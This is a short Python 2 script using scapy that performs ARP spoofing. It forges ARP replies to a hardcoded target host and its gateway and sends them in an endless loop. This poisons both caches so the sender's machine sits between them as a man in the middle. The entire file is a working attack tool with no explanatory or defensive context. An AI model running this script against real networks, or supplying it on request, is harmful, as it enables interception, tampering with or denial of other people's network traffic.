# --*--coding=utf-8--*--

from scapy.all import *
import optparse
import threading

import sys

reload(sys)
sys.setdefaultencoding('utf-8')


def getMac(tgtIP):
    try:
        tgtMac = getmacbyip(tgtIP)
        return tgtMac
    except:
        print 'alive?'


def createArp2Station(srcMac, tgtMac, gatewayIP, tgtIP):
    pkt = Ether(src=srcMac, dst=tgtMac) / ARP(hwsrc=srcMac, psrc=gatewayIP, hwdst=tgtMac, pdst=tgtIP, op=2)
    return pkt


def createArp2Gateway(srcMac, gatewayMac, tgtIP, gatewayIP):
    pkt = Ether(src=srcMac, dst=gatewayMac) / ARP(hwsrc=srcMac, psrc=tgtIP, hwdst=gatewayMac, pdst=gatewayIP, op=2)
    return pkt


def main():
    tgtIP = '10.0.34.113'
    gatewayIP = '10.0.0.1'

    if tgtIP == None or gatewayIP == None:
        print parser.print_help()
        exit(0)

    srcMac = '50:9A:4C:0F:A6:5B'
    print 'srcMac：', srcMac
    tgtMac = '54:9F:13:61:F2:5F'
    print 'tgtMac：', tgtMac
    gatewayMac = '00:50:56:ee:4b:0f'
    print 'gatewayMac：', gatewayMac
    raw_input('input')

    pktstation = createArp2Station(srcMac, tgtMac, gatewayIP, tgtIP)
    pktgateway = createArp2Gateway(srcMac, gatewayMac, tgtIP, gatewayIP)

    i = 1
    while True:
        t = threading.Thread(target=sendp, args=(pktstation,))
        t.start()
        t.join()
        print str(i) + ' [*]pC'

        s = threading.Thread(target=sendp, args=(pktgateway,))
        s.start()
        s.join()
        print str(i) + ' [*]gateway'
        i += 1


if __name__ == '__main__':
    main()